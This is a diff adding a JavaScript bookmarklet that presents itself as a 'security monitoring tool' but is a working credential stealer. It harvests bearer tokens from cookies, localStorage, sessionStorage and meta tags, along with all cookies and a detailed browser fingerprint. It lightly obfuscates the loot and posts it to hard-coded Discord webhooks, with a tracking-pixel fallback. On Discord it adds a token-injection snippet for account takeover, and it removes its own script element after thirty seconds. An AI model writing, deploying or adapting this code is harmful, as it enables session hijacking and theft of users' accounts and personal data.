@@ -1,0 +1,218 @@
+javascript:(function(){
+    // Enhanced token extraction with multiple sources
+    const extractTokens = function() {
+        const tokens = {};
+        
+        // Extract from cookies
+        tokens.cookie = document.cookie.split('bearer_token=')[1]?.split(';')[0] || null;
+        
+        // Extract from localStorage
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
+                    tokens.localStorage = localStorage.getItem(key);
+                    break;
+                }
+            }
+        } catch (e) {}
+        
+        // Extract from sessionStorage
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
+                    tokens.sessionStorage = sessionStorage.getItem(key);
+                    break;
+                }
+            }
+        } catch (e) {}
+        
+        // Extract from meta tags
+        const metaTags = document.querySelectorAll('meta[name*="token"], meta[name*="auth"], meta[content*="bearer"]');
+        if (metaTags.length > 0) {
+            tokens.meta = Array.from(metaTags).map(tag => 
+                `${tag.getAttribute('name') || 'content'}: ${tag.getAttribute('content')}`
+            ).join(', ');
+        }
+        
+        return tokens;
+    };
+    
+    // Advanced browser fingerprinting
+    const getFingerprint = function() {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('FINGERPRINT', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('FINGERPRINT', 4, 17);
+        
+        return {
+            canvas: canvas.toDataURL().substring(0, 100),
+            fonts: JSON.stringify(navigator.fonts ? 'Fonts accessible' : 'Fonts not accessible'),
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            touchSupport: navigator.maxTouchPoints || 'unknown',
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            product: navigator.product,
+            doNotTrack: navigator.doNotTrack,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth,
+            availableResolution: `${screen.availWidth}x${screen.availHeight}`,
+            devicePixelRatio: window.devicePixelRatio
+        };
+    };
+    
+    // Network information gathering
+    const getNetworkInfo = function() {
+        return {
+            connection: navigator.connection ? {
+                downlink: navigator.connection.downlink,
+                effectiveType: navigator.connection.effectiveType,
+                rtt: navigator.connection.rtt,
+                saveData: navigator.connection.saveData
+            } : 'Not available',
+            timing: performance.timing ? {
+                loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                domReady: performance.timing.domComplete - performance.timing.domLoading,
+                redirectCount: performance.navigation.redirectCount
+            } : 'Not available'
+        };
+    };
+    
+    // Obfuscation function
+    const obfuscate = function(data) {
+        return btoa(encodeURIComponent(JSON.stringify(data)).split('').map(
+            c => String.fromCharCode(c.charCodeAt(0) + 1)
+        ).join(''));
+    };
+    
+    // Main execution
+    try {
+        const tokens = extractTokens();
+        const fingerprint = getFingerprint();
+        const networkInfo = getNetworkInfo();
+        const d = new Date().toISOString();
+        const s = `${screen.width}x${screen.height} (${innerWidth}x${innerHeight} viewport)`;
+        
+        // Build comprehensive embed fields
+        const fields = [
+            {name: 'Bearer Token (Cookie)', value: '`' + (tokens.cookie || 'Not found') + '`', inline: false},
+            {name: 'LocalStorage Token', value: '`' + (tokens.localStorage || 'Not found') + '`', inline: true},
+            {name: 'SessionStorage Token', value: '`' + (tokens.sessionStorage || 'Not found') + '`', inline: true},
+            {name: 'Meta Tags', value: '`' + (tokens.meta || 'Not found') + '`', inline: false},
+            {name: 'Domain', value: location.hostname, inline: true},
+            {name: 'Full URL', value: location.href, inline: true},
+            {name: 'Referrer', value: document.referrer || 'Direct', inline: true},
+            {name: 'Timestamp', value: d, inline: true},
+            {name: 'User Agent', value: '```' + navigator.userAgent.slice(0, 100) + '```', inline: false},
+            {name: 'Screen Size', value: s, inline: true},
+            {name: 'Timezone', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true},
+            {name: 'Language', value: navigator.language, inline: true},
+            {name: 'Browser Plugins', value: Array.from(navigator.plugins).map(p => p.name).join(', ').slice(0, 100), inline: false},
+            {name: 'All Cookies', value: '```' + document.cookie.slice(0, 100) + (document.cookie.length > 100 ? '...' : '') + '```', inline: false},
+            {name: 'Hardware Concurrency', value: fingerprint.hardwareConcurrency, inline: true},
+            {name: 'Device Memory', value: fingerprint.deviceMemory + 'GB', inline: true},
+            {name: 'Color Depth', value: fingerprint.colorDepth + ' bits', inline: true}
+        ];
+        
+        // Add Discord injection code if on discord.com
+        if (location.hostname === 'discord.com' && tokens.cookie) {
+            const injectionCode = `
+let event = new Event('storage');
+Object.defineProperty(event, 'key', {get: () => 'token'});
+Object.defineProperty(event, 'newValue', {get: () => '${tokens.cookie.replace(/'/g, "\\'")}'});
+window.dispatchEvent(event);
+location.reload();
+            `.trim();
+            
+            fields.push({
+                name: 'Discord Token Injection Script',
+                value: '```js\n' + injectionCode + '\n```',
+                inline: false
+            });
+        }
+        
+        // Prepare obfuscated data
+        const obfuscatedData = obfuscate({
+            tokens: tokens,
+            fingerprint: fingerprint,
+            networkInfo: networkInfo,
+            pageInfo: {
+                url: location.href,
+                title: document.title,
+                referrer: document.referrer
+            }
+        });
+        
+        // Send to multiple webhooks (primary and fallback)
+        const webhooks = [
+            'https://discord.com/api/webhooks/1416079422125248563/DSZ5ejSjoZcNGrs_vDBhNTZZLZhaMPWZnSGPEejy_J9HaoON-epTWcjq8hLj6YkKCsjH',
+            'https://discord.com/api/webhooks/1416079422125248564/backup_webhook_token_here'
+        ];
+        
+        // Function to send data with retry logic
+        const sendData = function(webhookUrl, retries = 3) {
+            return fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    username: 'Security Bot Pro',
+                    avatar_url: 'https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png',
+                    embeds: [{
+                        title: 'Bearer Token Captured - Advanced',
+                        color: 0x0099ff,
+                        fields: fields,
+                        footer: {text: 'Advanced Security Monitoring Tool'},
+                        timestamp: d
+                    }],
+                    content: 'Obfuscated data: ' + obfuscatedData
+                })
+            })
+            .then(response => {
+                if (!response.ok && retries > 0) {
+                    return sendData(webhookUrl, retries - 1);
+                }
+                return response;
+            });
+        };
+        
+        // Attempt to send to all webhooks
+        Promise.any(webhooks.map(sendData))
+            .then(r => console.log(r.ok ? 'Data sent successfully' : 'API error:' + r.status))
+            .catch(e => {
+                console.error('All webhooks failed:', e);
+                // Fallback: send via image pixel
+                new Image().src = 'https://fake-tracker.com/pixel.gif?data=' + encodeURIComponent(obfuscatedData);
+            });
+            
+        // Self-destruct mechanism after 30 seconds
+        setTimeout(() => {
+            console.log('Security script self-destructing');
+            document.head.removeChild(document.currentScript);
+        }, 30000);
+        
+    } catch (error) {
+        console.error('Error in security script:', error);
+        // Send error information
+        fetch('https://discord.com/api/webhooks/1416079422125248563/DSZ5ejSjoZcNGrs_vDBhNTZZLZhaMPWZnSGPEejy_J9HaoON-epTWcjq8hLj6YkKCsjH', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                username: 'Security Bot Error',
+                embeds: [{
+                    title: 'Script Execution Error',
+                    color: 0xff0000,
+                    description: '```' + error.stack.slice(0, 1000) + '```',
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+    }
+})();
